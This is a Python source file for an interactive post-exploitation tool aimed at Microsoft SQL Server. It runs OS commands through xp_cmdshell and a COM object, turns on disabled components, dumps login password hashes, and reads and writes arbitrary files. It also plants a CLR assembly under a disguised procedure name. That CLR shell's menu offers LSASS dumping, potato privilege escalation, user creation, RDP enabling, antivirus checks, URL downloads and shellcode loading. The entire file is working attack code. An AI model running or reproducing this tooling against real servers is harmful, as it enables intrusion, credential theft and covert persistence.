import pymssql
import optparse
import binascii
import os

connect_list=[]
info_dict={}

def connect(host,port,username,password,dbname,id=0):
    try:
        if id==0:
            conn=pymssql.connect(server=host,port=port,user=username,password=password,database=dbname,autocommit=True)
        else:
            conn=pymssql.connect(server=host,port=port,database=dbname,autocommit=True)
        connect_list.append(conn)
        cursor=conn.cursor()
        print("[*] connect {}:{} sucess".format(host,port))
        info_dict["host"]=host
        info_dict["port"]=port
        info_dict["username"]=username
        info_dict["password"]=password
        info_dict["db_name"]=dbname
        info_dict["id"]=id
        return cursor
    except Exception as error:
        print("[-] connect {}:{} Faiure\n{},".format(host,port,error)+str(error))
        exit()

def xp_cmdshell(mssql,path,command):
    cmd_teample='cd /d {}&{}&echo [S]&cd&echo [E]'.format(path,command)
   # print(cmd_teample)
    try:
        mssql.execute("xp_cmdshell '{}'".format(cmd_teample))
        result=mssql.fetchall()
        current_path=result[-3]
        cmdoutput=result[:-4]
        for text in cmdoutput:
            print(text)
        return current_path
    except Exception as error:
        print(error)
        return None

def query_sql(mssql,sql):
   # print(sql)
    try:
        mssql.execute(sql)
        result = mssql.fetchall()
        return result
    except Exception as error:
        print(error)
        return None

def usershell(mssql):
    default_path = "C:"
    while True:
        user_input = input("{}>".format(default_path))
        if user_input == "exit":
            break
        result_path = xp_cmdshell(mssql, default_path, user_input)
        if result_path != None:
            default_path = str(result_path[0])


def startup_components(mssql):
    teample_sql="EXEC sp_configure 'show advanced options',1 RECONFIGURE EXEC sp_configure '{}',1 RECONFIGURE"
    user=input("component Name:")
    print("[*] StartUp {} components".format(teample_sql.format(user)))
    query_sql(mssql,teample_sql.format(user))

def custo_sql(mssql):
    while True:
        user_input=input("SQL>")
        if user_input=="exit":
            break
        result=query_sql(mssql, user_input)
        if result!=None:
            for data in result:
                print(data)

def info(mssql):
    is_dba=query_sql(mssql,"select IS_SRVROLEMEMBER('sysadmin')")
    version=query_sql(mssql,"select @@version")
    db_name=query_sql(mssql,"select db_name()")
    current_user=query_sql(mssql,"select SUSER_NAME()")
    hostname=query_sql(mssql,"select HOST_NAME()")
    result="HostName:{} Current_user:{} IS_DBA:{} DBNAME:{} DB_VER:{}".format(hostname[0][0],current_user[0][0],is_dba[0][0],db_name[0][0],version[0][0])
    print(result)

def get_Credentials(mssql):
    ver = query_sql(mssql, "select substring(@@version,1,29)")[0][0]
    sql="select sid,name,password_hash,type_desc,create_date,is_disabled,modify_date,default_database_name from sys.sql_logins"
    if "2000" in ver:
        sql=sql.replace("password_hash","password")
    Credentials_list=query_sql(mssql,sql)
    try:
        for cred in Credentials_list:
            sid=cred[0]
            name=cred[1]
            password=cred[2]
            type_desc=cred[3]
            create_date=cred[4]
            enable=cred[5]
            modify_date=cred[6]
            default_database=cred[7]
            print(f"sid:0x{binascii.hexlify(sid).decode()} username:{name} password_hash:0x{binascii.hexlify(password).decode()} type_desc:{type_desc} create_date:{create_date} is_enable:{enable} modify_date:{modify_date} default_database:{default_database}")
    except Exception as err:
        pass

def write_file(mssql):
    readfile=input("src_file_path>")
    if os.path.exists(readfile):
        filedata=open(readfile,"rb").read()
    else:
        return 0
    outputfile=input("output_file>")
    try:
        sql = f'''DECLARE @DATA VARBINARY(MAX) = 0x{binascii.hexlify(filedata).decode()} DECLARE @filepath VARCHAR(MAX) = '{outputfile}' DECLARE @ObjectToken INT EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT EXEC sp_OASetProperty @ObjectToken, 'Type', 1 EXEC sp_OAMethod @ObjectToken, 'Open' EXEC sp_OAMethod @ObjectToken, 'Write', NULL, @DATA EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL, @filepath, 2 EXEC sp_OAMethod @ObjectToken, 'Close' EXEC sp_OADestroy @ObjectToken SELECT @filepath'''
        ver=query_sql(mssql,"select substring(@@version,1,29)")[0][0]
        if "2000" in ver:
            sql=sql.replace("MAX","4000")
        query_sql(mssql,sql)
        print(f"[+] upload file sucess->{outputfile}")
    except Exception as error:
        print("[-] Upload File Failure,Error:"+str(error))

def read_file(mssql):
    dst_path=input("target_file_path>")
    save_path=os.path.join(os.getcwd(),os.path.split(dst_path)[-1])
    try:
        sql=f'''DECLARE @data VARBINARY(MAX) SELECT @data = BulkColumn FROM OPENROWSET(BULK '{dst_path}', SINGLE_BLOB) MyFile SELECT @data'''
        ver = query_sql(mssql, "select substring(@@version,1,29)")[0][0]
        if "2000" in ver:
            sql = sql.replace("MAX", "4000")
        filedata=query_sql(mssql, sql)[0][0]
        fp=open(save_path,"wb")
        fp.write(filedata)
        fp.close()
        print(f"[+] Download file sucess->{save_path}")
    except Exception as error:
        print("[-] Download File Failure,Error:" + str(error))


def com_run_execute(mssql):
    while True:
        user=input("execute_run>")
        if user=="exit":
            break
        sql='''declare @luan int,@exec int,@text int,@str varchar(8000); exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@luan output; exec sp_oamethod @luan,'exec',@exec  output,'AAAAAAAAAAAAAAAAAAAAAAAAA' exec sp_oamethod @exec, 'StdOut', @text out;exec sp_oamethod @text, 'readall', @str out select @str;'''.replace("AAAAAAAAAAAAAAAAAAAAAAAAA",user)
        try:
            output=query_sql(mssql,sql)[0][0]
            print(output)
        except Exception as error:
            print("[-] COM CLSID:{72C24DD5-D70A-438B-8A42-98424B88AFB8} Run Failure,"+str(error))

def enumerate_database(mssql):
    try:
        sql='''select name from master..sysdatabases'''
        dblist=query_sql(mssql,sql)
        for dbname in dblist:
            print(dbname[0])
    except Exception as error:
        print("[-] Enumerate database Failure"+str(error))

def clr_install(mssql):
    try:
        sql=open("lib/mssql_clr_install.txt","r",encoding="utf-8").read()
        privile=query_sql(mssql,f"ALTER DATABASE {info_dict['db_name']} SET TRUSTWORTHY ON")
        if privile==None:
            print("[+] Set permission Done")
            create_assembly=query_sql(mssql,sql)
            if create_assembly==None or create_assembly==create_assembly==[(1,)]:
                print("[+] create_assembly sucess")

            create_procedure=query_sql(mssql,"CREATE PROCEDURE [dbo].[sp_help_text_tables] @arg NVARCHAR (MAX) AS EXTERNAL NAME [sys_objects_mssql_log].[StoredProcedures].[ClrExec]")
            if create_procedure==None:
                 print("[+] create_procedure sucess")
        else:
            print("[-] Set permission Failure")
    except Exception as error:
        print("[-] Error Install Clr Failure,"+str(error))

def clr_uninstall(mssql):
    try:
        sql="drop PROCEDURE dbo.sp_help_text_tables;drop assembly sys_objects_mssql_log"
        output = query_sql(mssql, sql)
        print("[+] uninstall mssql tools clr sucess")
    except Exception as error:
        print("[-] Error Uninstall Clr Failure," + str(error))

def clr_shell(mssql):
    help_='''clr_pwd                       - print current directory by clr
    clr_ls {directory}            - list files by clr
    clr_cd {directory}            - change directory by clr
    clr_ps                        - list process by clr
    clr_netstat                   - netstat by clr
    clr_ping {host}               - ping by clr
    clr_cat {file}                - view file contents by clr
    clr_rm {file}                 - delete file by clr
    clr_exec {cmd}                - for example: clr_exec whoami;clr_exec -p c:\a.exe;clr_exec -p c:\cmd.exe -a /c whoami
    clr_efspotato {cmd}           - exec by EfsPotato like clr_exec
    clr_badpotato {cmd}           - exec by BadPotato like clr_exec
    clr_godpotato {cmd}           - exec by GodPotato like clr_exec
    clr_combine {remotefile}      - When the upload module cannot call CMD to perform copy to merge files
    clr_dumplsass {path}          - dumplsass by clr
    clr_rdp                       - check RDP port and Enable RDP
    clr_getav                     - get anti-virus software on this machin by clr
    clr_adduser {user} {pass}     - add user by clr
    clr_download {url} {path}     - download file from url by clr
    clr_scloader {shellcode}      - shellcode.bin
    clr_assembly {prog} {args}    - execute-assembly.   
    clr_assembly_sc {shellcode}   - assembly shellcode created by donut.   
'''
    import logging
    from impacket.examples import logger
    from lib import tds
    logger.init(False)
    logging.getLogger().setLevel(logging.INFO)
    try:
        ms_sql = tds.MSSQL(info_dict["host"], info_dict["port"])
        ms_sql.connect()
        if info_dict["id"]==0:
            ms_sql.login(info_dict["db_name"], info_dict["username"], info_dict["password"], ".", None, None)
        else:
            if "win_user" not in info_dict:
                win_user=input("WINDOWS_USERNAME:")
                win_pwd=input("WINDOWS_PWD(skip press enter):")
                win_ntlm=input("WINDOWS_NTLM(skip press enter):")
                win_domain=input("WINDOWS_DOMAIN:")
                if len(win_pwd)==0:
                    win_pwd=None
                if len(win_ntlm)==0:
                    win_ntlm=None
            else:
                win_domain=info_dict["domain"]
                win_user=info_dict["win_user"]
                win_pwd=info_dict["win_pwd"]
                win_ntlm=info_dict["win_ntlm"]
            ms_sql.login(info_dict["db_name"],win_user,win_pwd,win_domain,win_ntlm,True)
            if "win_user" not in info_dict:
                info_dict["domain"]=win_domain
                info_dict["win_user"]=win_user
                info_dict["win_pwd"]=win_pwd
                info_dict["win_ntlm"]=win_ntlm
        ms_sql.printReplies()
        print(help_)
        while True:
            user=input("CLR_SHELL>")
            if user=="exit":
                break
            space_list=user.split(" ")
            clr_name=space_list[0]
            clr_param=space_list[1:]
            clr_command=clr_name+" "+" ".join(clr_param)
            print(clr_command)
            ms_sql.sql_query(f'''exec dbo.sp_help_text_tables "{clr_command}"''')
            ms_sql.printReplies()
        ms_sql.disconnect()
    except Exception as error:
        print("[-] CLr Shell Error,"+str(error))


    try:
        sql='''exec sp_help_text_tables "clr_pwd"'''
        output = query_sql(mssql, sql)
        print(output)
    except Exception as error:
        print("[-] Error Uninstall Clr Failure," + str(error))

if __name__ == '__main__':
    parser=optparse.OptionParser()
    parser.add_option("-i",dest="host",help="target mssql host")
    parser.add_option("-p",dest="port",help="target mssql port(default:1433)")
    parser.add_option("-d",dest="dbname",help="DBName (default:master)")
    parser.add_option("-u",dest="username",help="Auth username")
    parser.add_option("-a",dest="password",help="Auath password")
    parser.add_option("--windows",dest="win_auth",action="store_true",help="windows certificate Auth")
    (option,args)=parser.parse_args()
    choice_list={1:usershell,2:startup_components,3:custo_sql,4:get_Credentials,5:write_file,6:read_file,7:com_run_execute,8:enumerate_database,9:clr_install,10:clr_uninstall,11:clr_shell}
    readme_list=["0.exit","1.xp_cmdshell (Easy to be killed by antivirus)","2.startup_components","3.Custom execution sql","4.Credentials acquisition","5.write file","6.read file","7.com_run_execute (Easy to be killed by antivirus)","8.enumerate database",
                 "9.sql tools clr install","10.sql tools clr uninstall","11.clr shell"]
    if option.port != None:
        mssql_port = int(option.port)
    else:
        mssql_port = 1433

    if option.dbname != None:
        db_name = option.dbname
    else:
        db_name = "master"

    if option.host and option.username and option.password:
        mssql = connect(option.host, mssql_port, option.username, option.password,db_name)

    if option.win_auth != None:
        mssql = connect(option.host, mssql_port, None, None, db_name, id=1)

    if option.username==None and option.win_auth==None:
        parser.print_help()
        exit(0)

    info(mssql)
    for choice in readme_list:
        print(choice)
    while True:
        user=input(">")
        try:
            if int(user)==0:
                break
        except Exception as err:
            print("[-] input not int")
            continue
        if int(user) in choice_list.keys():
            choice_list[int(user)](mssql)
        else:
            print("[-] no {} choice".format(user))
